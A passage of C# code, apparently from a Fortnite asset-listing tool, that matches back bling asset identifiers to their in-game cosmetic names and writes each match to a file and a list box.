                            bool BackBlingItems35 = x.Contains("050_hazmat");
                            if (BackBlingItems35)
                            {
                                sw.WriteLine("=> Pathogen");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Pathogen");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems36 = x.Contains("051_merman");
                            if (BackBlingItems36)
                            {
                                sw.WriteLine("=> Mertank");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Mertank");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems37 = x.Contains("052_hazmatfemale");
                            if (BackBlingItems37)
                            {
                                sw.WriteLine("=> Contagion");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Contagion");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems38 = x.Contains("053_jailbirdmale");
                            if (BackBlingItems38)
                            {
                                sw.WriteLine("=> Strongbox");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Strongbox");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems39 = x.Contains("054_jailbirdfemale");
                            if (BackBlingItems39)
                            {
                                sw.WriteLine("=> Burgle Bag");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Burgle Bag");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems40 = x.Contains("055_psburnout");
                            if (BackBlingItems40)
                            {
                                sw.WriteLine("=> Blue Shift");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Blue Shift");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems41 = x.Contains("056_fighterpilot");
                            if (BackBlingItems41)
                            {
                                sw.WriteLine("=> Bogey Bag");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Bogey Bag");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems42 = x.Contains("057_visitor");
                            if (BackBlingItems42)
                            {
                                sw.WriteLine("=> Offworld Rig");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Offworld Rig");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems43 = x.Contains("058_darkeagle");
                            if (BackBlingItems43)
                            {
                                sw.WriteLine("=> Battle Shroud");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Battle Shroud");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems44 = x.Contains("059_wwiipilot");
                            if (BackBlingItems44)
                            {
                                sw.WriteLine("=> Last Gasp");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Last Gasp");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems45 = x.Contains("060_darkninja");
                            if (BackBlingItems45)
                            {
                                sw.WriteLine("=> Ominous Orb");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Ominous Orb");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems47 = x.Contains("061_carbideorange");
                            if (BackBlingItems47)
                            {
                                sw.WriteLine("=> Stabilizer");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Stabilizer");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems48 = x.Contains("062_gumshoe");
                            if (BackBlingItems48)
                            {
                                sw.WriteLine("=> Evidence Bag");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Evidence Bag");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems49 = x.Contains("063_cuchulainn");
                            if (BackBlingItems49)
                            {
                                sw.WriteLine("=> Crested Cape");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Crested Cape");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems50 = x.Contains("064_fuzzybearind");
                            if (BackBlingItems50)
                            {
                                sw.WriteLine("=> Blasting Cap");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Blasting Cap");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems51 = x.Contains("065_carbideblack");
                            if (BackBlingItems51)
                            {
                                sw.WriteLine("=> Destabilizer");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Destabilizer");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems52 = x.Contains("066_speedyred");
                            if (BackBlingItems52)
                            {
                                sw.WriteLine("=> Deflector");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Deflector");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems53 = x.Contains("067_gumshoefemale");
                            if (BackBlingItems53)
                            {
                                sw.WriteLine("=> Confidential Case");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Confidential Case");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems54 = x.Contains("068_gumshoedark");
                            if (BackBlingItems54)
                            {
                                sw.WriteLine("=> Cluefinder");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Cluefinder");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems55 = x.Contains("069_decomale");
                            if (BackBlingItems55)
                            {
                                sw.WriteLine("=> Venturion Cape");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Venturion Cape");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems56 = x.Contains("070_decofemale");
                            if (BackBlingItems56)
                            {
                                sw.WriteLine("=> Ventura Cape");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Ventura Cape");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems57 = x.Contains("071_vikingfemale");
                            if (BackBlingItems57)
                            {
                                sw.WriteLine("=> Rearguard");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rearguard");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems58 = x.Contains("072_vikingmale");
                            if (BackBlingItems58)
                            {
                                sw.WriteLine("=> Enduring Cape");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Enduring Cape");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems59 = x.Contains("073_darkviking");
                            if (BackBlingItems59)
                            {
                                sw.WriteLine("=> Frozen Shroud");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Frozen Shroud");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems60 = x.Contains("074_lifeguardfemale");
                            if (BackBlingItems60)
                            {
                                sw.WriteLine("=> Pool Party");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Pool Party");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems61 = x.Contains("075_tacticalbadass");
                            if (BackBlingItems61)
                            {
                                sw.WriteLine("=> Uplink");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Uplink");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems62 = x.Contains("076_shark");
                            if (BackBlingItems62)
                            {
                                sw.WriteLine("=> Shark Fin");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Shark Fin");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems63 = x.Contains("077_wegame");
                            if (BackBlingItems63)
                            {
                                sw.WriteLine("=> Insignia");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Insignia");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems64 = x.Contains("078_streetracercobrafemale");
                            if (BackBlingItems64)
                            {
                                sw.WriteLine("=> Ballistic");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Ballistic");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems65 = x.Contains("079_penguin");
                            if (BackBlingItems65)
                            {
                                sw.WriteLine("=> Penguin");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Penguin");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems66 = x.Contains("080_streetracercobramale");
                            if (BackBlingItems66)
                            {
                                sw.WriteLine("=> Bat Attitude");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Bat Attitude");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems67 = x.Contains("081_scubamale");
                            if (BackBlingItems67)
                            {
                                sw.WriteLine("=> Diving Tank");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Diving Tank");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems68 = x.Contains("082_scubafemale");
                            if (BackBlingItems68)
                            {
                                sw.WriteLine("=> Air Tank");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Air Tank");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems69 = x.Contains("083_lifeguardmale");
                            if (BackBlingItems69)
                            {
                                sw.WriteLine("=> Rescue Ring");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rescue Ring");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems70 = x.Contains("084_birthday2018");
                            if (BackBlingItems70)
                            {
                                sw.WriteLine("=> Birthday Cake");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Birthday Cake");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems71 = x.Contains("085_modernmilitary");
                            if (BackBlingItems71)
                            {
                                sw.WriteLine("=> Paradigm");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Paradigm");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems72 = x.Contains("086_exercisefemale");
                            if (BackBlingItems72)
                            {
                                sw.WriteLine("=> Back Plate");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Back Plate");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems73 = x.Contains("087_exercisemale");
                            if (BackBlingItems73)
                            {
                                sw.WriteLine("=> Boombox");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Boombox");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems74 = x.Contains("088_sushichefmale");
                            if (BackBlingItems74)
                            {
                                sw.WriteLine("=> Chef's Choice");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Chef's Choice");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems75 = x.Contains("089_streetracerwhitefemale");
                            if (BackBlingItems75)
                            {
                                sw.WriteLine("=> Ignition");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Ignition");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems76 = x.Contains("090_streetracerwhitemale");
                            if (BackBlingItems76)
                            {
                                sw.WriteLine("=> Lane Splitter");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Lane Splitter");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems77 = x.Contains("091_durrrburgerhero");
                            if (BackBlingItems77)
                            {
                                sw.WriteLine("=> Deep Fried");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Deep Fried");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems78 = x.Contains("092_fuzzybearpanda");
                            if (BackBlingItems78)
                            {
                                sw.WriteLine("=> Bamboo");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Bamboo");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems79 = x.Contains("094_hippiefemale");
                            if (BackBlingItems79)
                            {
                                sw.WriteLine("=> Hip Shakers");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Hip Shakers");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems80 = x.Contains("095_ravenquillfemale");
                            if (BackBlingItems80)
                            {
                                sw.WriteLine("=> Dark Wings");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dark Wings");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems81 = x.Contains("096_bikermale");
                            if (BackBlingItems81)
                            {
                                sw.WriteLine("=> Road Ready");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Road Ready");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems82 = x.Contains("097_bikerfemale");
                            if (BackBlingItems82)
                            {
                                sw.WriteLine("=> Road Flair");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Road Flair");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems83 = x.Contains("098_bluesamuraimale");
                            if (BackBlingItems83)
                            {
                                sw.WriteLine("=> Sashimono");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Sashimono");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems84 = x.Contains("099_bluesamuraifemale");
                            if (BackBlingItems84)
                            {
                                sw.WriteLine("=> Shiro");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Shiro");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems85 = x.Contains("100_darkpaintballer");
                            if (BackBlingItems85)
                            {
                                sw.WriteLine("=> Subjugator");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Subjugator");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems86 = x.Contains("101_blingfemale");
                            if (BackBlingItems86)
                            {
                                sw.WriteLine("=> Swag Bag");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Swag Bag");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems87 = x.Contains("102_buckles");
                            if (BackBlingItems87)
                            {
                                sw.WriteLine("=> Buckled");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Buckled");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems88 = x.Contains("103_clawed");
                            if (BackBlingItems88)
                            {
                                sw.WriteLine("=> Slashed");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Slashed");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems89 = x.Contains("104_yellowzip");
                            if (BackBlingItems89)
                            {
                                sw.WriteLine("=> Vintage");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Vintage");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems90 = x.Contains("105_ghostportal");
                            if (BackBlingItems90)
                            {
                                sw.WriteLine("=> Ghost Portal");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Ghost Portal");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems91 = x.Contains("106_garagebandmale");
                            if (BackBlingItems91)
                            {
                                sw.WriteLine("=> Kick Drum");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Kick Drum");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems92 = x.Contains("107_garagebandfemale");
                            if (BackBlingItems92)
                            {
                                sw.WriteLine("=> Keytar");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Keytar");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems93 = x.Contains("108_blingmale");
                            if (BackBlingItems93)
                            {
                                sw.WriteLine("=> Cuff Case");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Cuff Case");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems94 = x.Contains("108_hacivatmale");
                            if (BackBlingItems94)
                            {
                                sw.WriteLine("=> Crafted Carrier");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Crafted Carrier");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems95 = x.Contains("109_medicmale");
                            if (BackBlingItems95)
                            {
                                sw.WriteLine("=> Care Package");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Care Package");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems96 = x.Contains("110_medicfemale");
                            if (BackBlingItems96)
                            {
                                sw.WriteLine("=> Gurney Gear");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Gurney Gear");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems97 = x.Contains("111_clownfemale");
                            if (BackBlingItems97)
                            {
                                sw.WriteLine("=> Battle");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Battle");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems98 = x.Contains("112_clownmale");
                            if (BackBlingItems98)
                            {
                                sw.WriteLine("=> Balloon Llama");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Balloon Llama");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems99 = x.Contains("113_darkvikingfemale");
                            if (BackBlingItems99)
                            {
                                sw.WriteLine("=> Valkyrie Wings");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Valkyrie Wings");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems100 = x.Contains("114_modernmilitaryred");
                            if (BackBlingItems100)
                            {
                                sw.WriteLine("=> Telemetry");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Telemetry");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems101 = x.Contains("116_dieselpunkfemale");
                            if (BackBlingItems101)
                            {
                                sw.WriteLine("=> Airflow");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Airflow");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems102 = x.Contains("117_octoberfestmale");
                            if (BackBlingItems102)
                            {
                                sw.WriteLine("=> Clockworks");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Clockworks");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems103 = x.Contains("118_octoberfestfemale");
                            if (BackBlingItems103)
                            {
                                sw.WriteLine("=> Pretzel Protector");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Pretzel Protector");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems104 = x.Contains("119_vampirefemale");
                            if (BackBlingItems104)
                            {
                                sw.WriteLine("=> Dusk Wings");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dusk Wings");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems105 = x.Contains("120_werewolf");
                            if (BackBlingItems105)
                            {
                                sw.WriteLine("=> Wolfpack");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Wolfpack");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems106 = x.Contains("121_redriding");
                            if (BackBlingItems106)
                            {
                                sw.WriteLine("=> Fabled Cape");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Fabled Cape");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems107 = x.Contains("122_halloweentomato");
                            if (BackBlingItems107)
                            {
                                sw.WriteLine("=> Night Cloak");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Night Cloak");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems108 = x.Contains("123_fortnitedj");
                            if (BackBlingItems108)
                            {
                                sw.WriteLine("=> Waveform");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Waveform");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems109 = x.Contains("115_dieselpunkmale");
                            if (BackBlingItems109)
                            {
                                sw.WriteLine("=> Para-provisions");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Para-provisions");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems110 = x.Contains("124_scarecrowmale");
                            if (BackBlingItems110)
                            {
                                sw.WriteLine("=> Hay Nest");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Hay Nest");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems111 = x.Contains("125_scarecrowfemale");
                            if (BackBlingItems111)
                            {
                                sw.WriteLine("=> Birdhovel");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Birdhovel");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems112 = x.Contains("126_darkbomber");
                            if (BackBlingItems112)
                            {
                                sw.WriteLine("=> Dark Bag");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dark Bag");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems113 = x.Contains("127_plaguemale");
                            if (BackBlingItems113)
                            {
                                sw.WriteLine("=> Dismal Cape");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dismal Cape");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems114 = x.Contains("128_plaguefemale");
                            if (BackBlingItems114)
                            {
                                sw.WriteLine("=> Arcanum");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Arcanum");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems115 = x.Contains("129_pumpkinslice");
                            if (BackBlingItems115)
                            {
                                sw.WriteLine("=> Mouldering Cloak");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Mouldering Cloak");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems116 = x.Contains("131_blackwidowfemale");
                            if (BackBlingItems116)
                            {
                                sw.WriteLine("=> Long Legs");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Long Legs");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems117 = x.Contains("132_blackwidowmale");
                            if (BackBlingItems117)
                            {
                                sw.WriteLine("=> Spider Shield");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Spider Shield");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems118 = x.Contains("133_guanyu");
                            if (BackBlingItems118)
                            {
                                sw.WriteLine("=> Loyal Shield");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Loyal Shield");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems119 = x.Contains("134_militaryfashion");
                            if (BackBlingItems119)
                            {
                                sw.WriteLine("=> Top Notch");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Top Notch");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems120 = x.Contains("135_muertosfemale");
                            if (BackBlingItems120)
                            {
                                sw.WriteLine("=> Calavera");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Calavera");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems121 = x.Contains("136_muertosmale");
                            if (BackBlingItems121)
                            {
                                sw.WriteLine("=> Spirit Cape");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Spirit Cape");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems122 = x.Contains("137_evilcowboy");
                            if (BackBlingItems122)
                            {
                                sw.WriteLine("=> Shackled Stone");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Shackled Stone");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems123 = x.Contains("138_celestial");
                            if (BackBlingItems123)
                            {
                                sw.WriteLine("=> Galactic Disc");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Galactic Disc");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems124 = x.Contains("142_raptorarcticcamo");
                            if (BackBlingItems124)
                            {
                                sw.WriteLine("=> Freezing Point");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Freezing Point");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems125 = x.Contains("130_vampiremale02");
                            if (BackBlingItems125)
                            {
                                sw.WriteLine("=> Coven Cape");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Coven Cape");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems126 = x.Contains("134_militaryfashion");
                            if (BackBlingItems126)
                            {
                                sw.WriteLine("=> Top Notch");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Top Notch");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems127 = x.Contains("135_muertosfemale");
                            if (BackBlingItems127)
                            {
                                sw.WriteLine("=> Calavera");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Calavera");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems128 = x.Contains("136_muertosmale");
                            if (BackBlingItems128)
                            {
                                sw.WriteLine("=> Spirit Cape");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Spirit Cape");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems129 = x.Contains("137_evilcowboy");
                            if (BackBlingItems129)
                            {
                                sw.WriteLine("=> Shackled Stone");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Shackled Stone");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems130 = x.Contains("138_celestial");
                            if (BackBlingItems130)
                            {
                                sw.WriteLine("=> Galactic Disc");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Galactic Disc");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems131 = x.Contains("142_raptorarcticcamo");
                            if (BackBlingItems131)
                            {
                                sw.WriteLine("=> Freezing Point");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Freezing Point");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems132 = x.Contains("139_fuzzybearhalloween");
                            if (BackBlingItems132)
                            {
                                sw.WriteLine("=> Goodie Gourd");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Goodie Gourd");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems133 = x.Contains("140_streetopsmale");
                            if (BackBlingItems133)
                            {
                                sw.WriteLine("=> Response Unit");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Response Unit");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems134 = x.Contains("141_streetopsfemale");
                            if (BackBlingItems134)
                            {
                                sw.WriteLine("=> Reaction Tank");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Reaction Tank");
                                }
                                backblingfound = backblingfound + 1;
                            }
                            bool BackBlingItems135 = x.Contains("142_samuraiultra");
                            if (BackBlingItems135)
                            {
                                sw.WriteLine("=> Bladed Wings");
                                if (ListBoxDisableText.Checked == false)
